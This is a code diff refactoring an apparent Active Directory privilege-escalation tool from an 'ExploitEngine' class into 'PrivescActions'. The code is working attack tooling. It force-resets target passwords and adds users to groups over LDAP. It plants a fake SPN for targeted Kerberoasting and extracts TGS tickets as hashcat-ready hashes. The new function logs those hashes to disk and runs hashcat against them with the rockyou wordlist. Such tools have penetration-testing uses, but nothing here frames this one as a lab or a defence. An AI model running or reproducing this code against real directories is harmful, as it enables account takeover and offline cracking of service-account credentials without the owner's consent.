@@ -1,18 +1,26 @@
-from ldap3 import MODIFY_ADD, MODIFY_REPLACE, SUBTREE, BASE
-import ldap3
-from impacket.krb5.kerberosv5 import getKerberosTGS, getKerberosTGT
-from impacket.krb5.types import Principal
+"""Shared privesc actions for the module-based architecture."""
+
+import binascii
+import logging
+import re
+import subprocess
+from datetime import datetime
+from pathlib import Path
+
 from impacket.krb5 import constants
 from impacket.krb5.asn1 import TGS_REP
+from impacket.krb5.kerberosv5 import getKerberosTGS, getKerberosTGT
+from impacket.krb5.types import Principal
+from ldap3 import BASE, MODIFY_ADD, SUBTREE
 from pyasn1.codec.der import decoder
-import binascii
-#from impacket.krb5.asn1 import AS_REP, enc_as_rep_part_helper, TG_REP, enc_tg_rep_part_helper
 
-class ExploitEngine:
-    def __init__(self, connection, domain, dc_ip):
-        self.conn = connection
-        self.domain = domain
-        self.dc_ip = dc_ip
+
+class PrivescActions:
+    def __init__(self, engine):
+        self.engine = engine
+        self.conn = engine.conn
+        self.domain = engine.domain
+        self.dc_ip = engine.dc_ip
 
     def resolve_distinguished_name(self, identity):
         """Resolve a DN from UPN/name/sAMAccountName/cn when path data lacks DN."""
@@ -27,7 +35,6 @@ class ExploitEngine:
         if not search_base:
             return None
 
-        # Predictive paths often expose only the object name or UPN.
         candidate = str(identity)
         sam = candidate.split("@")[0] if "@" in candidate else candidate
         ldap_filter = (
@@ -61,7 +68,6 @@ class ExploitEngine:
         if "@" in raw_user:
             return raw_user.split("@")[0]
 
-        # If we're bound as a DN, query sAMAccountName / UPN from that object.
         if raw_user.upper().startswith("CN="):
             try:
                 if self.conn.search(
@@ -86,72 +92,47 @@ class ExploitEngine:
         return raw_user
 
     def force_change_password(self, target_dn, new_password):
-        """Step 1: Reset password using extended rights."""
         print(f"[*] Exploiting ForceChangePassword on {target_dn}...")
-        # Modern ldap3 way to reset AD passwords
         result = self.conn.extend.microsoft.modify_password(target_dn, new_password)
         if result:
             print(f"[+] Password successfully changed to: {new_password}")
         return result
 
     def add_group_member(self, group_dn, user_dn):
-        """Step 2: Add a user to a group (GenericWrite/AddMember)."""
         print(f"  [*] Attempting LDAP MODIFY_ADD for member attribute...")
-        success = self.conn.modify(
-            group_dn, 
-            {'member': [(ldap3.MODIFY_ADD, [user_dn])]}
-        )
-        
-        if not success:
-            # Check if the error is "Entry Already Exists" (LDAP Code 68)
-            if self.conn.result['result'] == 68:
-                print(f"  [-] Target is already a member of this group. Skipping safely.")
-                return True # Treat as a success for the chain
-            
+        success = self.conn.modify(group_dn, {"member": [(MODIFY_ADD, [user_dn])]})
+
+        if not success and self.conn.result["result"] == 68:
+            print(f"  [-] Target is already a member of this group. Skipping safely.")
+            return True
+
         return success
 
     def set_fake_spn(self, target_dn, spn_value="viper/roasted"):
-        """
-        Step 3: Set an SPN for Kerberoasting.
-        If the value already exists, we treat it as a success.
-        """
         print(f"  [*] Attempting LDAP MODIFY_ADD for servicePrincipalName...")
-        success = self.conn.modify(
-            target_dn, 
-            {'servicePrincipalName': [(ldap3.MODIFY_ADD, [spn_value])]}
-        )
-        
+        success = self.conn.modify(target_dn, {"servicePrincipalName": [(MODIFY_ADD, [spn_value])]})
+
         if not success:
-            # Result 68 = Entry Already Exists (for objects)
-            # Diagnostic 1006 = Attribute or Value Exists (for specific attributes)
-            result_code = self.conn.result['result']
-            diagnostic = self.conn.result.get('message', '')
-            
+            result_code = self.conn.result["result"]
+            diagnostic = self.conn.result.get("message", "")
+
             if result_code == 68 or "1006" in diagnostic:
                 print(f"  [-] SPN value '{spn_value}' already exists on target. Skipping safely.")
-                return True # Treat as success for the automation chain
+                return True
 
             print("  [!] SPN SET FAILED")
             print(f"  [!] LDAP ERROR: {self.conn.result.get('description', 'Unknown')}")
             print(f"  [!] DIAGNOSTIC: {diagnostic or 'No detail provided'}")
-            
+
         return success
 
     def request_kerberoast_hash(self, target_user_name, spn, current_password):
-        """
-        Remote TGS-REQ with strict formatting to avoid 'seekable bit stream' errors.
-        """
         print(f"  [*] INITIATING: Remote TGS-REQ for SPN {spn}")
-        
+
         try:
-            # 1. Format the SPN Principal correctly
-            # Impacket's Principal class is picky about how it receives the SPN
             target_principal = Principal(spn, type=constants.PrincipalNameType.NT_SRV_INST.value)
-            
-            # 2. Extract only the username if it's in DN or Down-Level format
             user = self._resolve_kerberos_username()
-            
-            # 3. Get a TGT for the current identity (required by current Impacket API)
+
             client_principal = Principal(user, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
             tgt, cipher, old_session_key, session_key = getKerberosTGT(
                 client_principal,
@@ -162,7 +143,6 @@ class ExploitEngine:
                 kdcHost=str(self.dc_ip),
             )
 
-            # 4. Request TGS for target SPN using the acquired TGT
             tgs, cipher, old_session_key, session_key = getKerberosTGS(
                 target_principal,
                 str(self.domain),
@@ -172,32 +152,64 @@ class ExploitEngine:
                 session_key,
             )
 
-            # 5. Success! Extract encrypted ticket data in a version-tolerant way
             etype = 23
             blob = None
 
             if isinstance(tgs, (bytes, bytearray)):
                 decoded_tgs = decoder.decode(tgs, asn1Spec=TGS_REP())[0]
-                etype = int(decoded_tgs['ticket']['enc-part']['etype'])
-                blob = decoded_tgs['ticket']['enc-part']['cipher'].asOctets()
+                etype = int(decoded_tgs["ticket"]["enc-part"]["etype"])
+                blob = decoded_tgs["ticket"]["enc-part"]["cipher"].asOctets()
             else:
-                etype = int(tgs['ticket']['enc-part']['etype'])
-                cipher_field = tgs['ticket']['enc-part']['cipher']
-                blob = cipher_field.asOctets() if hasattr(cipher_field, 'asOctets') else bytes(cipher_field)
+                etype = int(tgs["ticket"]["enc-part"]["etype"])
+                cipher_field = tgs["ticket"]["enc-part"]["cipher"]
+                blob = cipher_field.asOctets() if hasattr(cipher_field, "asOctets") else bytes(cipher_field)
 
-            # Hashcat-compatible formatting for RC4-HMAC (etype 23).
             if etype == 23 and len(blob) >= 16:
                 checksum = binascii.hexlify(blob[:16]).decode()
                 encrypted = binascii.hexlify(blob[16:]).decode()
                 real_hash = f"$krb5tgs$23$*{target_user_name}${self.domain}${spn}*${checksum}${encrypted}"
             else:
-                # Fallback: keep full cipher blob so automation can continue/log.
                 real_hash = f"$krb5tgs${etype}$*{target_user_name}*{self.domain}*{spn}*{binascii.hexlify(blob).decode()}"
-            
+
             print(f"  [+] HASH EXTRACTED: {real_hash[:60]}...")
             return real_hash
-            
+
         except Exception as e:
-            # This captures the 'seekable bit stream' or any other Kerberos error
             print(f"  [!] KERBEROAST FAILED: {str(e)}")
             return False
+
+    def persist_hash_and_maybe_crack(self, hash_value, target_user_name, spn_value):
+        """Optionally persist the hash to a .kirbi file and run hashcat."""
+        if not hash_value:
+            return False
+
+        # Keep the existing text log for tracking.
+        text_log = Path.cwd() / "data" / "extracted_hashes.txt"
+        text_log.parent.mkdir(parents=True, exist_ok=True)
+        timestamp = datetime.utcnow().isoformat(timespec="seconds") + "Z"
+        with text_log.open("a", encoding="utf-8") as fh:
+            fh.write(f"{timestamp} | target={target_user_name} | spn={spn_value} | {hash_value}\n")
+
+        answer = input("Attempt to crack extracted hash with hashcat? [y/N]: ").strip().lower()
+        if answer not in {"y", "yes"}:
+            logging.info("Hash cracking skipped by user.")
+            return True
+
+        safe_name = re.sub(r"[^A-Za-z0-9._-]+", "_", str(target_user_name).split("@")[0].lower())
+        kirbi_path = Path.cwd() / "data" / f"{safe_name}.kirbi"
+        kirbi_path.write_text(f"{hash_value}\n", encoding="utf-8")
+        logging.info(f"Saved hash to {kirbi_path}")
+
+        hashcat_cmd = ["hashcat", "-m", "13100", str(kirbi_path), "/usr/share/wordlists/rockyou.txt"]
+        logging.info("Running: %s", " ".join(hashcat_cmd))
+
+        try:
+            completed = subprocess.run(hashcat_cmd, check=False)
+            if completed.returncode != 0:
+                logging.warning(f"hashcat exited with code {completed.returncode}")
+        except FileNotFoundError:
+            logging.error("hashcat not found in PATH.")
+        except Exception as exc:
+            logging.error(f"hashcat execution failed: {exc}")
+
+        return True
